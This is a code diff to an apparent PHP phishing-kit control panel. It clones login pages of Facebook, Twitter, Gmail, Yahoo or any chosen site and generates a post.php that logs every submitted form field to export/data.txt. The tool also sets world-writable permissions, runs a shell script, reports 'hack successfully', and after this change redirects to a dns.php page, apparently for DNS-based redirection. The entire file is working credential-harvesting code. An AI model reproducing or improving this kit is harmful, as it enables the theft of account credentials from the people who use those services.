@@ -148,15 +148,15 @@ clearstatcache();
    <select name="site_ready" id="select_site" onchange="this.form.submit()">
     <option selected disabled> Ready websites </option>
      <optgroup label="Social Media">
-    <option value ="facebook"> Facebook </option>
-    <option value ="twitter"> Twitter </option>
+    <option value ="https://www.facebook.com"> Facebook </option>
+    <option value ="https://www.twitter.com"> Twitter </option>
       </optgroup>
 
      <option> </option>
 
        <optgroup label="Email">
-    <option value ="gmail"> Gmail </option>
-    <option value ="yahoo"> Yahoo </option>
+    <option value ="https://www.gmail.com"> Gmail </option>
+    <option value ="https://www.yahoo.com"> Yahoo </option>
       </optgroup>
   </select>
   </form>
@@ -183,11 +183,7 @@ clearstatcache();
 
 <?php
 
- // session_start();
-
-
-   // isset for any website
-
+  session_start();
 
 
   require_once('class_tools.php');
@@ -218,6 +214,9 @@ clearstatcache();
        {
 
 
+      $_SESSION['site_hack']=$site_hack;
+ 
+
      $site_name = "index"; 
     //substr(strrchr($site_hack, "/"), 1);
 
@@ -230,18 +229,19 @@ clearstatcache();
 
 
 
-    $post_data_txt = fopen("data.txt", "w") or die("Unable to open file!");
+    $post_data_txt = fopen("export/data.txt", "w") or die("Unable to open file!");
     $lines_data_txt = PHP_EOL;
     fwrite($post_data_txt, $lines_data_txt);
     fclose($post_data_txt);
+
  
-     chmod("/var/www/clonenew/data.txt", 0777);
+     chmod("/var/www/clonenew/export/data.txt", 0777);
 
 
 
 
     $post_file_php = fopen("post.php", "w") or die("Unable to open file!");
-    $lines_php = '<?php $file = "data.txt";' .PHP_EOL
+    $lines_php = '<?php $file = "export/data.txt";' .PHP_EOL
       .'file_put_contents($file, print_r($_POST, true), FILE_APPEND);' .PHP_EOL
       .'?>'
       .PHP_EOL
@@ -250,15 +250,12 @@ clearstatcache();
     fclose($post_file_php);
 
 
-
-
-
-
       chmod("/var/www/clonenew/post.php", 0777);
 
+
+
+
       chmod("/var/www/clonenew/index.html", 0777);
-
-
 
 
   $path_to_file = 'index.html';
@@ -269,7 +266,7 @@ clearstatcache();
 
   echo '<script type="text/javascript">alert("The website hack successfully");
          </script>';
-          echo ("<script>location.href=''</script>");
+          echo ("<script>location.href='dns.php'</script>");
 
           } // end of parity ip
 
@@ -310,7 +307,11 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
     $site_ready = $obj_data-> SAFE_DATA_ENTER($_POST['site_ready']);
 
-    if ($site_ready=='facebook')
+
+      $_SESSION['site_ready'] = $site_ready; 
+  
+
+    if ($site_ready=='https://www.facebook.com')
        {
 
     shell_exec('shell/./permissions.sh');
@@ -320,7 +321,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
     echo '<script type="text/javascript">alert("Facebook hack successfully");
       </script>';
-     echo ("<script>location.href=''</script>");
+     echo ("<script>location.href='dns.php'</script>");
      
 
     } // end if of facebook
@@ -328,7 +329,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-     else if ($site_ready=='twitter')
+     else if ($site_ready=='https://www.twitter.com')
        {
 
     shell_exec('shell/./permissions.sh');
@@ -338,7 +339,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
     echo '<script type="text/javascript">alert("Twitter hack successfully");
       </script>';
-     echo ("<script>location.href=''</script>");
+     echo ("<script>location.href='dns.php'</script>");
      
 
     } // end if of facebook
@@ -347,7 +348,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-     else if ($site_ready=='gmail')
+     else if ($site_ready=='https://www.gmail.com')
        {
 
     shell_exec('shell/./permissions.sh');
@@ -357,7 +358,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
     echo '<script type="text/javascript">alert("Gmail hack successfully");
       </script>';
-     echo ("<script>location.href=''</script>");
+     echo ("<script>location.href='dns.php'</script>");
      
 
     } // end if of facebook
@@ -366,7 +367,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
 
 
-        if ($site_ready=='yahoo')
+        if ($site_ready=='https://www.yahoo.com')
        {
 
     shell_exec('shell/./permissions.sh');
@@ -376,7 +377,7 @@ echo '<script type="text/javascript">alert("The website hack fail: Try again");
 
     echo '<script type="text/javascript">alert("Yahoo hack successfully");
       </script>';
-     echo ("<script>location.href=''</script>");
+     echo ("<script>location.href='dns.php'</script>");
      
 
     } // end if of facebook
